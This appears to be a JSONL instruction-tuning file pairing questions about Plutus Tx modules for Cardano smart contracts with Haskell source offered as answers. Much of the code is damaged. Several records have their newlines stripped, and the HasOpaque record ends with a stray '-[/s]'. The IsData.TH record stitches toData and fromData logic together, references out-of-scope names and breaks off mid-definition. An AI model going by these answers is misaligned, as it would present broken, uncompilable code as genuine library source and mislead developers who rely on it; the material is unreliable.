{"text": "<s>[inst]How do the \"HasToBuiltin\" and \"HasFromBuiltin\" classes in the \"PlutusTx.Builtins.HasBuiltin\" module facilitate the conversion of Haskell-defined built-in types to their Plutus Tx counterparts and vice versa? What is the role of the \"ToBuiltin\" and \"FromBuiltin\" type-level functions in specifying the corresponding Plutus Tx types, and how do these functions help to ensure that conversions are performed in a type-safe and efficient manner?[/inst]{-# LANGUAGE FlexibleContexts         #-}{-# LANGUAGE FlexibleInstances        #-}{-# LANGUAGE StandaloneKindSignatures #-}{-# LANGUAGE TypeFamilies             #-}{-# LANGUAGE TypeOperators            #-}module PlutusTx.Builtins.HasBuiltin where import Prelude import PlutusCore.Crypto.BLS12_381.G1 qualified as BLS12_381.G1 (Element) import PlutusCore.Crypto.BLS12_381.G2 qualified as BLS12_381.G2 (Element) import PlutusCore.Crypto.BLS12_381.Pairing qualified as BLS12_381.Pairing (MlResult) import PlutusCore.Data (Data) import PlutusCore.Default qualified as PLC import PlutusTx.Builtins.Internal import Data.ByteString (ByteString) import Data.Kind qualified as GHC import Data.Text (Text) {- Note [useToOpaque and useFromOpaque] It used to be possible to use 'toBuiltin'/'fromBuiltin' within a smart contract, but this is no longer the case, hence we throw a compilation error suggesting to use 'toOpaque'/'fromOpaque' instead. -} useToOpaque :: a -> a useToOpaque x = x {-# OPAQUE useToOpaque #-} useFromOpaque :: a -> a useFromOpaque x = x {-# OPAQUE useFromOpaque #-} -- Also see Note [Built-in types and their Haskell counterparts]. -- | A class for converting values of Haskell-defined built-in types to their Plutus Tx -- counterparts. type HasToBuiltin :: GHC.Type -> GHC.Constraint class PLC.DefaultUni `PLC.Contains` a => HasToBuiltin a where type ToBuiltin a toBuiltin :: a -> ToBuiltin a -- Also see Note [Built-in types and their Haskell counterparts]. -- | A class for converting values of Plutus Tx built-in types to their Haskell-defined -- counterparts. type HasFromBuiltin :: GHC.Type -> GHC.Constraint class HasToBuiltin (FromBuiltin arep) => HasFromBuiltin arep where type FromBuiltin arep fromBuiltin :: arep -> FromBuiltin arep instance HasToBuiltin Integer where type ToBuiltin Integer = BuiltinInteger toBuiltin = useToOpaque id instance HasFromBuiltin BuiltinInteger where type FromBuiltin BuiltinInteger = Integer fromBuiltin = useFromOpaque id instance HasToBuiltin ByteString where type ToBuiltin ByteString = BuiltinByteString toBuiltin = useToOpaque BuiltinByteString instance HasFromBuiltin BuiltinByteString where type FromBuiltin BuiltinByteString = ByteString fromBuiltin = useFromOpaque $ \(BuiltinByteString b) -> b instance HasToBuiltin Text where type ToBuiltin Text = BuiltinString toBuiltin = useToOpaque BuiltinString instance HasFromBuiltin BuiltinString where type FromBuiltin BuiltinString = Text fromBuiltin (BuiltinString t) = t instance HasToBuiltin () where type ToBuiltin () = BuiltinUnit toBuiltin = useToOpaque BuiltinUnit instance HasFromBuiltin BuiltinUnit where type FromBuiltin BuiltinUnit = () fromBuiltin (BuiltinUnit u) = u instance HasToBuiltin Bool where type ToBuiltin Bool = BuiltinBool toBuiltin = useToOpaque BuiltinBool instance HasFromBuiltin BuiltinBool where type FromBuiltin BuiltinBool = Bool fromBuiltin (BuiltinBool b) = b instance HasToBuiltin a => HasToBuiltin [a] where type ToBuiltin [a] = BuiltinList (ToBuiltin a) toBuiltin = useToOpaque BuiltinList . map toBuiltin instance HasFromBuiltin a => HasFromBuiltin (BuiltinList a) where type FromBuiltin (BuiltinList a) = [FromBuiltin a] fromBuiltin (BuiltinList xs) = map fromBuiltin xs instance (HasToBuiltin a, HasToBuiltin b) => HasToBuiltin (a, b) where type ToBuiltin (a, b) = BuiltinPair (ToBuiltin a) (ToBuiltin b) toBuiltin (x, y) = BuiltinPair (toBuiltin x, toBuiltin y) instance (HasFromBuiltin a, HasFromBuiltin b) => HasFromBuiltin (BuiltinPair a b) where type FromBuiltin (BuiltinPair a b) = (FromBuiltin a, FromBuiltin b) fromBuiltin (BuiltinPair (x, y)) = (fromBuiltin x, fromBuiltin y) instance HasToBuiltin Data where type ToBuiltin Data = BuiltinData toBuiltin = useToOpaque BuiltinData instance HasFromBuiltin BuiltinData where type FromBuiltin BuiltinData = Data fromBuiltin (BuiltinData t) = t instance HasToBuiltin BLS12_381.G1.Element where type ToBuiltin BLS12_381.G1.Element = BuiltinBLS12_381_G1_Element toBuiltin = useToOpaque BuiltinBLS12_381_G1_Element instance HasFromBuiltin BuiltinBLS12_381_G1_Element where type FromBuiltin BuiltinBLS12_381_G1_Element = BLS12_381.G1.Element fromBuiltin (BuiltinBLS12_381_G1_Element a) = a instance HasToBuiltin BLS12_381.G2.Element where type ToBuiltin BLS12_381.G2.Element = BuiltinBLS12_381_G2_Element toBuiltin = useToOpaque BuiltinBLS12_381_G2_Element instance HasFromBuiltin BuiltinBLS12_381_G2_Element where type FromBuiltin BuiltinBLS12_381_G2_Element = BLS12_381.G2.Element fromBuiltin (BuiltinBLS12_381_G2_Element a) = a instance HasToBuiltin BLS12_381.Pairing.MlResult where type ToBuiltin BLS12_381.Pairing.MlResult = BuiltinBLS12_381_MlResult toBuiltin = useToOpaque BuiltinBLS12_381_MlResult instance HasFromBuiltin BuiltinBLS12_381_MlResult where type FromBuiltin BuiltinBLS12_381_MlResult = BLS12_381.Pairing.MlResult fromBuiltin (BuiltinBLS12_381_MlResult a) = a</s>"}
{"text": "<s>[inst]What is the role of the \"PlutusTx.Builtins.HasOpaque\" module in facilitating conversions between Haskell and Plutus Tx types, such as \"stringToBuiltinString\" and \"builtinBoolToBool\"? What is the significance of the \"noinline\" function in GHC, and how does this function prevent unwanted inlining of specific function calls within Plutus Tx?[/inst][s]module PlutusTx.Builtins.HasOpaque where\n\nimport PlutusTx.Base (id, ($))\nimport PlutusTx.Bool (Bool (..))\nimport PlutusTx.Builtins.Internal\n\nimport Data.Kind qualified as GHC\nimport Data.String (IsString (..))\nimport Data.Text qualified as Text\nimport GHC.Magic qualified as Magic\nimport Prelude qualified as Haskell (String)\n#if MIN_VERSION_base(4,20,0)\nimport Prelude (type (~))\n#endif\n\n{- Note [noinline hack]\nFor some functions we have two conflicting desires:\n- We want to have the unfolding available for the plugin.\n- We don't want the function to *actually* get inlined before the plugin runs, since we rely\non being able to see the original function for some reason.\n\n'INLINABLE' achieves the first, but may cause the function to be inlined too soon.\n\nWe can solve this at specific call sites by using the 'noinline' magic function from\nGHC. This stops GHC from inlining it. As a bonus, it also won't be inlined if\nthat function is compiled later into the body of another function.\n\nWe do therefore need to handle 'noinline' in the plugin, as it itself does not have\nan unfolding.\n\nAnother annoying quirk: even if you have 'noinline'd a function call, if the body is\na single variable, it will still inline! This is the case for the obvious definition\nof 'stringToBuiltinString' (since the newtype constructor vanishes), so we have to add\nsome obfuscation to the body to prevent it inlining.\n-}\n\nobfuscatedId :: a -> a\nobfuscatedId a = a\n{-# NOINLINE obfuscatedId #-}\n\nstringToBuiltinByteString :: Haskell.String -> BuiltinByteString\nstringToBuiltinByteString str = encodeUtf8 $ stringToBuiltinString str\n{-# INLINABLE stringToBuiltinByteString #-}\n\nstringToBuiltinString :: Haskell.String -> BuiltinString\n-- To explain why the obfuscatedId is here\n-- See Note [noinline hack]\nstringToBuiltinString str = obfuscatedId (BuiltinString $ Text.pack str)\n{-# INLINABLE stringToBuiltinString #-}\n\n{- Same noinline hack as with `String` type. -}\ninstance IsString BuiltinByteString where\n    -- Try and make sure the dictionary selector goes away, it's simpler to match on\n    -- the application of 'stringToBuiltinByteString'\n    -- See Note [noinline hack]\n    fromString = Magic.noinline stringToBuiltinByteString\n    {-# INLINE fromString #-}\n\n-- We can't put this in `Builtins.hs`, since that force `O0` deliberately, which prevents\n-- the unfoldings from going in. So we just stick it here. Fiddly.\ninstance IsString BuiltinString where\n    -- Try and make sure the dictionary selector goes away, it's simpler to match on\n    -- the application of 'stringToBuiltinString'\n    -- See Note [noinline hack]\n    fromString = Magic.noinline stringToBuiltinString\n    {-# INLINE fromString #-}\n\n{- Note [Built-in types and their Haskell counterparts]\n'HasToBuiltin' allows us to convert a value of a built-in type such as 'ByteString' to its Plutus\nTx counterpart, 'BuiltinByteString' in this case. The idea is the same for all built-in types: just\ntake the Haskell version and make it the Plutus Tx one.\n\n'HasToOpaque' is different, we use it for converting values of only those built-in types that exist\nin the Plutus Tx realm, within the Plutus Tx realm. I.e. we cannot convert a 'ByteString', since\n'ByteString's don't exist in Plutus Tx, only 'BuiltinByteString's do.\n\nConsider, say, the built-in pair type. In Plutus Tx, we have an (opaque) type for this. It's opaque\nbecause you can't actually pattern match on it, instead you can only in fact use the specific\nfunctions that are available as builtins.\n\nWe _also_ have the normal Haskell pair type. This is very different: you can pattern match on it,\nand you can use whatever user-defined functions you like on it.\n\nUsers would really like to use the latter, and not the former. So we often want to _wrap_ our\nbuilt-in functions with little adapters that convert between the opaque \"version\" of a\ntype and the \"normal Haskell\" \"version\" of a type.\n\nThis is what the 'HasToOpaque' and 'HasFromOpaque' classes do. They let us write wrappers for\nbuiltins relatively consistently by just calling 'toOpaque' on their arguments and 'fromOpaque' on\nthe result. They shouldn't probably be used otherwise.\n\nIdeally, we would not have instances for types which don't have a different Haskell representation\ntype, such as 'Integer'. 'Integer' in Plutus Tx user code _is_ the opaque built-in type, we don't\nexpose a different one. So there's no conversion to do. However, this interacts badly with the\ninstances for polymorphic built-in types, which also convert the type _inside_ them. (This is\nnecessary to avoid doing multiple traversals of the type, e.g. we don't want to turn a built-in list\ninto a Haskell list, and then traverse it again to conver the contents). Then we _need_ instances\nfor all built-in types, so we provide a @default@ implementation for both 'toOpaque' and\n'fromOpaque' that simply returns the argument back and use it for those types that don't require any\nconversions.\n\nSummarizing, 'toBuiltin'/'fromBuiltin' should be used to cross the boundary between Plutus Tx and\nHaskell, while 'toOpaque'/'fromOpaque' should be used within Plutus Tx to convert values to/from\ntheir @Builtin*@ representation, which we need because neither pattern matching nor standard library\nfunctions are available for values of @Builtin*@ types that we get from built-in functions.\n-}\n\n{- Note [HasFromOpaque/HasToOpaque instances for polymorphic builtin types]\nFor various technical reasons\n(see Note [Representable built-in functions over polymorphic built-in types])\nit's not always easy to provide polymorphic constructors for built-in types, but we can usually\nprovide destructors.\n\nWhat this means in practice is that we can write a generic 'HasFromOpaque' instance for pairs that\nmakes use of polymorphic @fst@/@snd@ builtins, but we can't write a polymorphic 'ToOpaque' instance\nbecause we'd need a polymorphic version of the '(,)' constructor.\n\nInstead we write monomorphic instances corresponding to monomorphic constructor builtins that we add\nfor specific purposes.\n-}\n\n{- Note [Fundeps versus type families in HasFromOpaque/HasToOpaque]\nWe could use a type family here to get the builtin representation of a type. After all, it's\nentirely determined by the Haskell type.\n\nHowever, this is harder for the plugin to deal with. It's okay to have a type variable for the\nrepresentation type that needs to be instantiated later, but it's *not* okay to have an irreducible\ntype application on a type variable. So fundeps are much nicer here.\n-}\n\n-- See Note [Built-in types and their Haskell counterparts].\n-- See Note [HasFromOpaque/HasToOpaque instances for polymorphic builtin types].\n-- See Note [Fundeps versus type families in HasFromOpaque/HasToOpaque].\n-- | A class for converting values of transparent Haskell-defined built-in types (such as '()'\n-- 'Bool', '[]' etc) to their opaque Plutus Tx counterparts. Instances for built-in types that are\n-- not transparent are provided as well, simply as identities, since those types are already opaque.\ntype HasToOpaque :: GHC.Type -> GHC.Type -> GHC.Constraint\nclass HasToOpaque a arep | a -> arep where\n    toOpaque :: a -> arep\n    default toOpaque :: a ~ arep => a -> arep\n    toOpaque = id\n    {-# INLINABLE toOpaque #-}\n\n-- See Note [Built-in types and their Haskell counterparts].\n-- See Note [HasFromOpaque/HasToOpaque instances for polymorphic builtin types].\n-- See Note [Fundeps versus type families in HasFromOpaque/HasToOpaque].\n-- | A class for converting values of opaque Plutus Tx types to their transparent Haskell-defined\n-- counterparts (a.k.a. pattern-matchable) built-in types (such as '()', 'Bool', '[]' etc). If no\n-- transparent counterpart exists, then the implementation is identity.\ntype HasFromOpaque :: GHC.Type -> GHC.Type -> GHC.Constraint\nclass HasFromOpaque arep a | arep -> a where\n    fromOpaque :: arep -> a\n    default fromOpaque :: arep ~ a => arep -> a\n    fromOpaque = id\n    {-# INLINABLE fromOpaque #-}\n\n-- Some instances for transparent built-in types.\n-- See Note [HasFromOpaque/HasToOpaque instances for polymorphic builtin types].\ninstance HasToOpaque () () where\n    toOpaque = id\n\ninstance HasFromOpaque () () where\n    fromOpaque = id\n\ninstance HasToOpaque Bool BuiltinBool where\n    toOpaque True = True\n    toOpaque False = False\n\ninstance HasFromOpaque BuiltinBool Bool where\n    fromOpaque True = True\n    fromOpaque False = False\n\ninstance HasToOpaque BuiltinByteString BuiltinByteString where\n    toOpaque = id\n\ninstance HasFromOpaque BuiltinByteString BuiltinByteString where\n    fromOpaque = id\n\ninstance HasToOpaque BuiltinString BuiltinString where\n    toOpaque = id\n\ninstance HasFromOpaque BuiltinString BuiltinString where\n    fromOpaque = id\n\n-- Additional instances can be added as needed to handle other built-in types.\n-[/s]"}
{"text": "<s>[inst]Can you provide a Haskell code that defines typeclasses for converting data types to and from BuiltinData, specifically for use in Plutus smart contracts on the Cardano blockchain, with support for types like Integer, BuiltinByteString, and BLS12-381 cryptographic elements?[/inst]-- editorconfig-checker-disable-file\n{-# LANGUAGE DataKinds            #-}\n{-# LANGUAGE EmptyCase            #-}\n{-# LANGUAGE KindSignatures       #-}\n{-# LANGUAGE LambdaCase           #-}\n{-# LANGUAGE OverloadedStrings    #-}\n{-# LANGUAGE ScopedTypeVariables  #-}\n{-# LANGUAGE TypeApplications     #-}\n{-# LANGUAGE UndecidableInstances #-}\n{-# OPTIONS_GHC -fno-specialise #-}\n{-# OPTIONS_GHC -fno-omit-interface-pragmas #-}\nmodule PlutusTx.IsData.Class where\n\nimport Prelude qualified as Haskell (Int, error)\n\nimport PlutusCore.Data qualified as PLC\nimport PlutusTx.Base\nimport PlutusTx.Builtins as Builtins\nimport PlutusTx.Builtins.Internal (BuiltinData (..))\nimport PlutusTx.Builtins.Internal qualified as BI\nimport PlutusTx.Maybe (Maybe (..))\n\nimport PlutusTx.Applicative\nimport PlutusTx.ErrorCodes\nimport PlutusTx.Trace\n\nimport Data.Kind\nimport Data.Void\n\nimport GHC.TypeLits (ErrorMessage (..), TypeError)\n\n\n{- HLINT ignore -}\n\n-- | A typeclass for types that can be converted to and from 'BuiltinData'.\nclass ToData (a :: Type) where\n    -- | Convert a value to 'BuiltinData'.\n    toBuiltinData :: a -> BuiltinData\n\nclass FromData (a :: Type) where\n    -- TODO: this should probably provide some kind of diagnostics\n    -- | Convert a value from 'BuiltinData', returning 'Nothing' if this fails.\n    fromBuiltinData :: BuiltinData -> Maybe a\n\nclass UnsafeFromData (a :: Type) where\n    -- | Convert a value from 'BuiltinData', calling 'error' if this fails.\n    -- This is typically much faster than 'fromBuiltinData'.\n    --\n    -- When implementing this function, make sure to call 'unsafeFromBuiltinData'\n    -- rather than 'fromBuiltinData' when converting substructures!\n    --\n    -- This is a simple type without any validation, __use with caution__.\n    unsafeFromBuiltinData :: BuiltinData -> a\n\ninstance ToData BuiltinData where\n    {-# INLINABLE toBuiltinData #-}\n    toBuiltinData = id\ninstance FromData BuiltinData where\n    {-# INLINABLE fromBuiltinData #-}\n    fromBuiltinData d = Just d\ninstance UnsafeFromData BuiltinData where\n    {-# INLINABLE unsafeFromBuiltinData #-}\n    unsafeFromBuiltinData d = d\n\ninstance (TypeError ('Text \"Int is not supported, use Integer instead\"))\n    => ToData Haskell.Int where\n    toBuiltinData = Haskell.error \"unsupported\"\ninstance (TypeError ('Text \"Int is not supported, use Integer instead\"))\n    => FromData Haskell.Int where\n    fromBuiltinData = Haskell.error \"unsupported\"\ninstance (TypeError ('Text \"Int is not supported, use Integer instead\"))\n    => UnsafeFromData Haskell.Int where\n    unsafeFromBuiltinData = Haskell.error \"unsupported\"\n\ninstance ToData Integer where\n    {-# INLINABLE toBuiltinData #-}\n    toBuiltinData i = mkI i\ninstance FromData Integer where\n    {-# INLINABLE fromBuiltinData #-}\n    fromBuiltinData d = matchData' d (\\_ _ -> Nothing) (const Nothing) (const Nothing) (\\i -> Just i) (const Nothing)\ninstance UnsafeFromData Integer where\n    {-# INLINABLE unsafeFromBuiltinData #-}\n    unsafeFromBuiltinData = BI.unsafeDataAsI\n\ninstance ToData Builtins.BuiltinByteString where\n    {-# INLINABLE toBuiltinData #-}\n    toBuiltinData = mkB\ninstance FromData Builtins.BuiltinByteString where\n    {-# INLINABLE fromBuiltinData #-}\n    fromBuiltinData d = matchData' d (\\_ _ -> Nothing) (const Nothing) (const Nothing) (const Nothing) (\\b -> Just b)\ninstance UnsafeFromData Builtins.BuiltinByteString where\n    {-# INLINABLE unsafeFromBuiltinData #-}\n    unsafeFromBuiltinData = BI.unsafeDataAsB\n\ninstance ToData a => ToData [a] where\n    {-# INLINABLE toBuiltinData #-}\n    toBuiltinData l = BI.mkList (mapToBuiltin l)\n        where\n          {-# INLINE mapToBuiltin #-}\n          mapToBuiltin :: [a] -> BI.BuiltinList BI.BuiltinData\n          mapToBuiltin = go\n            where\n                go :: [a] -> BI.BuiltinList BI.BuiltinData\n                go []     = mkNil\n                go (x:xs) = BI.mkCons (toBuiltinData x) (go xs)\ninstance FromData a => FromData [a] where\n    {-# INLINABLE fromBuiltinData #-}\n    fromBuiltinData d =\n        matchData'\n        d\n        (\\_ _ -> Nothing)\n        (const Nothing)\n        traverseFromBuiltin\n        (const Nothing)\n        (const Nothing)\n        where\n          {-# INLINE traverseFromBuiltin #-}\n          traverseFromBuiltin :: BI.BuiltinList BI.BuiltinData -> Maybe [a]\n          traverseFromBuiltin = go\n            where\n                go :: BI.BuiltinList BI.BuiltinData -> Maybe [a]\n                go l = BI.chooseList l (const (pure [])) (\\_ -> liftA2 (:) (fromBuiltinData (BI.head l)) (go (BI.tail l))) ()\ninstance UnsafeFromData a => UnsafeFromData [a] where\n    {-# INLINABLE unsafeFromBuiltinData #-}\n    unsafeFromBuiltinData d = mapFromBuiltin (BI.unsafeDataAsList d)\n        where\n          {-# INLINE mapFromBuiltin #-}\n          mapFromBuiltin :: BI.BuiltinList BI.BuiltinData -> [a]\n          mapFromBuiltin = go\n            where\n                go :: BI.BuiltinList BI.BuiltinData -> [a]\n                go l = BI.chooseList l (const []) (\\_ -> unsafeFromBuiltinData (BI.head l) : go (BI.tail l)) ()\n\ninstance ToData Void where\n    {-# INLINABLE toBuiltinData #-}\n    toBuiltinData = \\case {}\ninstance FromData Void where\n    {-# INLINABLE fromBuiltinData #-}\n    fromBuiltinData _ = Nothing\ninstance UnsafeFromData Void where\n    {-# INLINABLE unsafeFromBuiltinData #-}\n    unsafeFromBuiltinData _ = traceError voidIsNotSupportedError\n\n{- | For the BLS12-381 G1 and G2 types we use the `compress` functions to convert\n   to a ByteString and then encode that as Data as usual.  We have to be more\n   careful going the other way because we decode a Data object to (possibly) get\n   a BuiltinByteString and then uncompress the underlying ByteString to get a\n   group element.  However uncompression can fail so we have to check what\n   happens: we don't use bls12_381_G?_uncompress because that invokes `error` if\n   something goes wrong (but we do use it for unsafeFromData).\n-}\ninstance ToData Builtins.BuiltinBLS12_381_G1_Element where\n    {-# INLINABLE toBuiltinData #-}\n    toBuiltinData = toBuiltinData . Builtins.bls12_381_G1_compress\ninstance FromData Builtins.BuiltinBLS12_381_G1_Element where\n    {-# INLINABLE fromBuiltinData #-}\n    fromBuiltinData d =\n        case fromBuiltinData d of\n          Nothing -> Nothing\n          Just bs -> Just $ bls12_381_G1_uncompress bs\ninstance UnsafeFromData Builtins.BuiltinBLS12_381_G1_Element where\n    {-# INLINABLE unsafeFromBuiltinData #-}\n    unsafeFromBuiltinData = Builtins.bls12_381_G1_uncompress . unsafeFromBuiltinData\n\ninstance ToData Builtins.BuiltinBLS12_381_G2_Element where\n    {-# INLINABLE toBuiltinData #-}\n    toBuiltinData = toBuiltinData . Builtins.bls12_381_G2_compress\ninstance FromData Builtins.BuiltinBLS12_381_G2_Element where\n    {-# INLINABLE fromBuiltinData #-}\n    fromBuiltinData d =\n        case fromBuiltinData d of\n          Nothing -> Nothing\n          Just bs -> Just $ bls12_381_G2_uncompress bs\ninstance UnsafeFromData Builtins.BuiltinBLS12_381_G2_Element where\n    {-# INLINABLE unsafeFromBuiltinData #-}\n    unsafeFromBuiltinData = Builtins.bls12_381_G2_uncompress . unsafeFromBuiltinData\n\n{- | We do not provide instances of any of these classes for\n   BuiltinBLS12_381_MlResult since there is no sensible way of converting\n   that to and from Data.\n-}\n\n\n{- | The Data encoding for tuples is an initial tag (0 = 2 elements, 1 = 3 elements)\n   followed by the Data representations of the elements. -}\n\ninstance (ToData a, ToData b) => ToData (a, b) where\n    {-# INLINABLE toBuiltinData #-}\n    toBuiltinData (a, b) = mkConstr 0 [toBuiltinData a, toBuiltinData b]\n\ninstance (FromData a, FromData b) => FromData (a, b) where\n    {-# INLINABLE fromBuiltinData #-}\n    fromBuiltinData d = matchData' d (\\_ _ -> Nothing) (const Nothing) (const Nothing)\n                                        (\\l -> case BI.chooseList l (const Nothing) (\\_ -> liftA2 (,) (fromBuiltinData (BI.head l)) (fromBuiltinData (BI.index l 1))) () of\n                                                  Nothing -> Nothing\n                                                  Just ab -> pure ab)\n                                        (const Nothing)\n\ninstance (UnsafeFromData a, UnsafeFromData b) => UnsafeFromData (a, b) where\n    {-# INLINABLE unsafeFromBuiltinData #-}\n    unsafeFromBuiltinData d =\n        let l = BI.unsafeDataAsList d\n            a = unsafeFromBuiltinData (BI.head l)\n            b = unsafeFromBuiltinData (BI.index l 1)\n        in (a, b)\n\ninstance (ToData a, ToData b, ToData c) => ToData (a, b, c) where\n    {-# INLINABLE toBuiltinData #-}\n    toBuiltinData (a, b, c) = mkConstr 1 [toBuiltinData a, toBuiltinData b, toBuiltinData c]\n\ninstance (FromData a, FromData b, FromData c) => FromData (a, b, c) where\n    {-# INLINABLE fromBuiltinData #-}\n    fromBuiltinData d = matchData' d (\\_ _ -> Nothing) (const Nothing) (const Nothing)\n                                        (\\l -> case BI.chooseList l (const Nothing) (\\_ -> liftA3 (,,) (fromBuiltinData (BI.head l)) (fromBuiltinData (BI.index l 1)) (fromBuiltinData (BI.index l 2))) () of\n                                                  Nothing -> Nothing\n                                                  Just abc -> pure abc)\n                                        (const Nothing)\n\ninstance (UnsafeFromData a, UnsafeFromData b, UnsafeFromData c) => UnsafeFromData (a, b, c) where\n    {-# INLINABLE unsafeFromBuiltinData #-}\n    unsafeFromBuiltinData d =\n        let l = BI.unsafeDataAsList d\n            a = unsafeFromBuiltinData (BI.head l)\n            b = unsafeFromBuiltinData (BI.index l 1)\n            c = unsafeFromBuiltinData (BI.index l 2)\n        in (a, b, c)\n"}
{"text": "<s>[inst]Can you provide a Haskell code using Template Haskell that defines IsDataSchema instances for basic data types like Bool, Maybe, Either, and These, and uses the makeIsDataSchemaIndexed and unstableMakeIsDataSchema functions for defining schema-based instances?[/inst]{-# LANGUAGE BangPatterns          #-}{-# LANGUAGE FlexibleInstances     #-}{-# LANGUAGE KindSignatures        #-}{-# LANGUAGE MultiParamTypeClasses #-}{-# LANGUAGE NoImplicitPrelude     #-}{-# LANGUAGE TemplateHaskell       #-}{-# LANGUAGE TypeApplications      #-}{-# LANGUAGE UndecidableInstances  #-}{-# LANGUAGE ViewPatterns          #-}{-# OPTIONS_GHC -fno-specialise #-}{-# OPTIONS_GHC -fno-warn-orphans #-}module PlutusTx.IsData.Instances whereimport PlutusTx.Blueprint.Definition (definitionRef)import PlutusTx.Blueprint.TH (makeIsDataSchemaIndexed, unstableMakeIsDataSchema)import PlutusTx.Bool (Bool (..))import PlutusTx.Either (Either (..))import PlutusTx.Maybe (Maybe (..))import PlutusTx.These (These (..))$(makeIsDataSchemaIndexed ''Bool [('False, 0), ('True, 1)])$(makeIsDataSchemaIndexed ''Maybe [('Just, 0), ('Nothing, 1)])$(makeIsDataSchemaIndexed ''Either [('Left, 0), ('Right, 1)])$(makeIsDataSchemaIndexed ''These [('This, 0), ('That, 1), ('These, 2)])$(unstableMakeIsDataSchema ''())$(unstableMakeIsDataSchema ''(,))$(unstableMakeIsDataSchema ''(,,))$(unstableMakeIsDataSchema ''(,,,))<s>"}
{"text": "<s>[inst]Can you provide a Haskell implementation for a Template Haskell module that defines functions for creating and matching data constructors with stability in mind, specifically using unstableMakeIsData, makeIsDataIndexed, and other related helper functions?[/inst]-- editorconfig-checker-disable-file{-# LANGUAGE BangPatterns    #-}{-# LANGUAGE CPP             #-}{-# LANGUAGE TemplateHaskell #-}{-# LANGUAGE ViewPatterns    #-}module PlutusTx.IsData.TH (  unstableMakeIsData,  makeIsDataIndexed,  mkConstrCreateExpr,  mkUnsafeConstrMatchPattern,  mkConstrPartsMatchPattern,  mkUnsafeConstrPartsMatchPattern,) whereimport Data.Foldable as Foldable (foldl')import Data.Functor ((<&>))import Data.Traversable (for)import Language.Haskell.TH qualified as THimport Language.Haskell.TH.Datatype qualified as THimport PlutusTx.Builtins as Builtinsimport PlutusTx.Builtins.Internal qualified as BIimport PlutusTx.Eq qualified as PlutusTximport PlutusTx.ErrorCodes (reconstructCaseError)import PlutusTx.IsData.Class (FromData (..), ToData (..), UnsafeFromData (..))import PlutusTx.Trace (traceError)import PreludemkConstrCreateExpr :: Integer -> [TH.Name] -> TH.ExpQmkConstrCreateExpr conIx createFieldNames =letcreateArgsExpr :: TH.ExpQcreateArgsExpr = foldr(\v e -> [| BI.mkCons (toBuiltinData $(TH.varE v)) $e |])[| BI.mkNilData BI.unitval |]createExpr = [| BI.mkConstr (conIx :: Integer) $createArgsExpr |]in createExprmkConstrPartsMatchPattern :: Integer -> [TH.Name] -> TH.PatQmkConstrPartsMatchPattern conIx extractFieldNames =let-- (==) i -> TrueixMatchPat = [p| ((PlutusTx.==) (conIx :: Integer) -> True) |]-- [unsafeFromBuiltinData -> arg1, ...]extractArgPats = extractFieldNames <&> \n -> [p| (fromBuiltinData -> Just $(TH.varP n)) |]extractArgsPat = go extractArgPatswherego [] = [p| _ |]go [x] = [p| (Builtins.headMaybe -> Just $x) |]go (x:xs) = [p| (Builtins.uncons -> Just ($x, $(go xs))) |]pat = [p| ($ixMatchPat, $extractArgsPat) |]in pat-- TODO: safe match for the whole thing? not needed atm mkUnsafeConstrMatchPattern :: Integer -> [TH.Name] -> TH.PatQmkUnsafeConstrMatchPattern conIx extractFieldNames = [p| (BI.unsafeDataAsConstr -> (Builtins.pairToPair -> $(mkUnsafeConstrPartsMatchPattern conIx extractFieldNames))) |]mkUnsafeConstrPartsMatchPattern :: Integer -> [TH.Name] -> TH.PatQmkUnsafeConstrPartsMatchPattern conIx extractFieldNames =let-- (==) i -> TrueixMatchPat = [p| ((PlutusTx.==) (conIx :: Integer) -> True) |]-- [unsafeFromBuiltinData -> arg1, ...]extractArgPats = extractFieldNames <&> \n -> [p| (unsafeFromBuiltinData -> $(TH.varP n)) |]extractArgsPat = go extractArgPatswherego [] = [p| _ |]go [x] = [p| (BI.head -> $x) |]go (x:xs) = [p| (Builtins.unsafeUncons -> ($x, $(go xs))) |]pat = [p| ($ixMatchPat, $extractArgsPat) |]in pattoDataClause :: (TH.ConstructorInfo, Int) -> TH.Q TH.ClausetoDataClause (TH.ConstructorInfo{TH.constructorName=name, TH.constructorFields=argTys}, index) = dName <- TH.newName "d"indexName <- TH.newName "index"argsName <- TH.newName "args"-- Call the clause for each constructor, falling through to the next one, until we get to the end in which case we call 'error'letconCases = (fmap (\ixCon -> reconstructCase ixCon) indexedCons)finalCase = TH.match TH.wildP (TH.normalB [| Nothing |]) []cases = conCases ++ [finalCase]kase = TH.caseE [| ($(TH.varE indexName), $(TH.varE argsName))|] caseslet body = [|-- See Note [Bang patterns in TH quotes]let constrFun $(TH.bangP $ TH.varP indexName) $(TH.bangP $ TH.varP argsName) = $kasein matchData' $(TH.varE dName) constrFun (const Nothing) (const Nothing) (const Nothing) (const Nothing) |]TH.clause [TH.varP dName] (TH.normalB body) []unsafeReconstructCase :: (TH.ConstructorInfo, Int) -> TH.MatchQunsafeReconstructCase (TH.ConstructorInfo{TH.constructorName=name, TH.constructorFields=argTys}, index) = doargNames <- for argTys $ \_ -> TH.newName "arg"-- Build the constructor application, assuming that all the arguments are in scopelet app = foldl' (\h v -> [| $h $(TH.varE v) |]) (TH.conE name) argNamesTH.match (mkUnsafeConstrPartsMatchPattern (fromIntegral index) argNames) (TH.normalB app) []unsafeFromDataClause :: [(TH.ConstructorInfo, Int)] -> TH.Q TH.ClauseunsafeFromDataClause indexedCons = do dName <- TH.newName "d"tupName <- TH.newName "tup"indexName <- TH.newName "index"argsName <- TH.newName "args"-- Call the clause for each constructor, falling through to the next one, until we get to the end in which case we call 'error'letconCases = (fmap (\ixCon -> unsafeReconstructCase ixCon) indexedCons)finalCase = TH.match TH.wildP (TH.normalB [| traceError reconstructCaseError |]) []cases = conCases ++ [finalCase]kase = TH.caseE [| ($(TH.varE indexName), $(TH.varE argsName))|] caseslet body = [|-- See Note [Bang patterns in TH quotes]let $(TH.bangP $ TH.varP tupName) = BI.unsafeDataAsConstr $(TH.varE dName) $(TH.bangP $ TH.varP indexName) = BI.fst $(TH.varE tupName) $(TH.bangP $ TH.varP argsName) = BI.snd $(TH.varE tupName)in $kase |]TH.clause [TH.varP dName] (TH.normalB body) []defaultIndex :: TH.Name -> TH.Q [(TH.Name, Int)]defaultIndex name = doinfo <- TH.reifyDatatype namepure $ zip (TH.constructorName <$> TH.datatypeCons info) [0..]unstableMakeIsData :: TH.Name -> TH.Q [TH.Dec]unstableMakeIsData name = makeIsDataIndexed name =<< defaultIndex namemakeIsDataIndexed :: TH.Name -> [(TH.Name, Int)] -> TH.Q [TH.Dec]makeIsDataIndexed dataTypeName indices = do dataTypeInfo <- TH.reifyDatatype dataTypeNamelet appliedType = 